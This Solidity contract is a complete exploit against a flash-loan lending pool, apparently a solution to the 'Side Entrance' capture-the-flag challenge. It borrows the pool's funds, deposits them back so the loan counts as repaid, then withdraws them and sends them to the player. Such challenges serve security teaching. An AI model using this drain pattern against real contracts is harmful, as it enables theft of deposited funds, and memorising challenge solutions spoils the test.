// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideEntranceLenderPoolAttacker {
    uint private amount;
    address payable private player;
    ISideEntranceLenderPool private pool;

    constructor(address _pool, address payable _player, uint _amount) {
        pool = ISideEntranceLenderPool(_pool);
        player = _player;
        amount = _amount;
    }
    
    function attack() public {

        pool.flashLoan(amount);

        pool.withdraw();

        player.transfer(amount);        
    }

    function execute() external payable {
        pool.deposit{value: amount}();
    }

    // we need to be able to receive funds when we call withdraw()
    receive() external payable {}
}
